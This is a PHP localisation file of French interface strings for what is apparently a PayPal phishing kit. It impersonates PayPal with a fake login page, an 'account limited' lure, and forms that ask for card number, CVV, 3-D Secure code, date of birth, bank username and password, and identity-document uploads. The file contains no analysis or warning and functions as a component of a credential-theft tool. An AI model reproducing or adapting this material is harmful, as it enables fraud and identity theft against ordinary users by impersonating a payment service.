<?php

#LOGIN
$wiz.oussvmv_111 = 'Connectez-vous à votre compte PayPal';
$wiz.oussvmv_222 = 'Ayant des problèmes de connexion?';
$wiz.oussvmv_333 = "S'inscrire";
$wiz.oussvmv_444 = 'Tous droits réservés Pour PayPal Inc';
$wiz.oussvmv_900 = 'Email';
$wiz.oussvmv_901 = 'Mot de passe';
$wiz.oussvmv_902 = "S'identifier";
#INFO
$wiz_555 = 'Profil';
$wiz_666 = 'Mettre à jour votre photo';
$wiz_777 = 'Re-bonjour!';
$wiz_888 = 'Votre compte PayPal a été limité!';
$wiz_999 = 'Information requise';
$wiz_903 = 'Prénom';
$wiz_904 = 'Nom de famille';
$wiz_905 = 'Adresse';
$wiz_906 = 'Ville';
$wiz_907 = 'Etat';
$wiz_910 = 'ZIP';
$wiz_911 = 'Numéro de téléphone';
#-----NAV
$wiz_101 = 'Résumé';
$wiz_102 = 'Activité';
$wiz_103 = 'Transfert';
$wiz_104 = 'Portefeuille';
$wiz_105 = 'Magasiner';
$wiz_106 = 'Se déconnecter';
$wiz_107 = 'Menu principal';
$wiz_108 = 'Compte';
$wiz_109 = 'la sécurité';
$wiz_112 = 'Paiements';
$wiz_113 = 'Notifications';
#------FOOTER
$wiz_114 = 'AIDE/NOUS CONTACTER';
$wiz_115 = 'SÉCURITÉ';
$wiz_116 = 'Tous droits réservés.';
$wiz_117 = 'Respect de la vie privée';
$wiz_118 = 'Contrats d’utilisation';
$wiz_119 = 'Commentaires';
#-------CCV
$wiz_120 = 'Credit Card';
$wiz_121 = 'Nom dans la Carte';
$wiz_123 = 'Numéro de Carte';
$wiz_124 = "Date d'exp.";
$wiz_125 = 'CVV à (3-4) chiffres';
$wiz_126 = 'Address';
$wiz_127 = 'Confirmer';
#--------VBV
$wiz_128 = 'Bienvenue à la vérification ™';
$wiz_129 = "S'il vous plaît entrer les informations ci-dessous pour vérifier votre identité.";
$wiz_130 = "Date d'expiration de la carte:";
$wiz_131 = 'Code de validation:';
$wiz_132 = 'Date de naissance:';
$wiz_133 = 'Mot de passe ou SecureCode (3d):';
$wiz_134 = 'Tous les droits sont réservés.';
#--------BANK
$wiz_135 = "Choisissez l'une de ces banques communes";
$wiz_136 = 'Securisé';
$wiz_137 = "J'ai une autre banque";
$wiz_138 = "Il est sûr de partager cette information. PayPal ne pas enregistrer.";
$wiz_139 = 'En cliquant';
$wiz_140 = 'Continuer';
$wiz_141 = "Je suis d'accord sur les termes et conditions pour lier mon compte bancaire.";
$wiz_142 = 'Votre Bank';
$wiz_143 = "Il est sûr de partager cette information. PayPal ne pas enregistrer.";
$wiz_144 = 'Username';
$wiz_145 = 'Mot de passe';
$wiz_146 = 'En cliquant';
$wiz_147 = 'Continuer';
$wiz_148 = "J'accepte les conditions générales de connexion de mon compte bancaire.";
$wiz_149 = 'Votre banque';
$wiz_150 = 'Nom de la banque';
#--------Loading AND Police
$wiz_151 = 'En traitement';
$wiz_152 = 'Activités suspectes - Payapl';
$wiz_153 = "Pour protéger votre compte, nous recherchons régulièrement des signes précurseurs d'activités potentiellement frauduleuses.";
$wiz_154 = 'Nous sommes préoccupés par une activité non autorisée potentielle';
$wiz_155 = 'Après avoir confirmé votre identité, nous vous expliquerons les étapes à suivre pour rendre votre compte plus sécurisé.';
$wiz_156 = 'Connexion depuis un périphérique inconnu';
$wiz_157 = 'Près de Ossining, US';
$wiz_158 = "Juste pour être sûr, nous voulons nous assurer que c'est votre compte.";
$wiz_159 = 'Contact';
$wiz_160 = 'la sécurité';
$wiz_161 = 'Se déconnecter';
$wiz_162 = "Les étapes suivantes, vous devez pleinement rempli pour maintenir la sécurité de votre compte et qu'il n'est pas une percée";
#--------UPLOAD CART ID
$wiz_163 = 'confirme ton identité';
$wiz_164 = 'Sélectionner';
$wiz_165 = "Télécharger une preuve d'identité (recommandée)";
$wiz_166 = 'Recevoir un texte';
$wiz_167 = 'Recevoir un appel téléphonique automatisé';
$wiz_168 = "Essayez cette option non disponible Essayez d'autres options";
$wiz_169 = 'Quel type de document téléchargez-vous?';
$wiz_170 = 'Afficher les exigences des fichiers';
$wiz_171 = 'Les fichiers doivent être inférieurs à 10 Mo.';
$wiz_172 = "Utilisez l'un de ces types de fichiers: JPG, GIF, PNG ou PDF.";
$wiz_173 = 'Téléchargez des fichiers qui affichent des informations à jour et lisibles.';
$wiz_174 = 'Sélectionner un';
$wiz_175 = "Permis de conduire";
$wiz_176 = 'Passeport';
$wiz_177 = 'ID militaire';
?>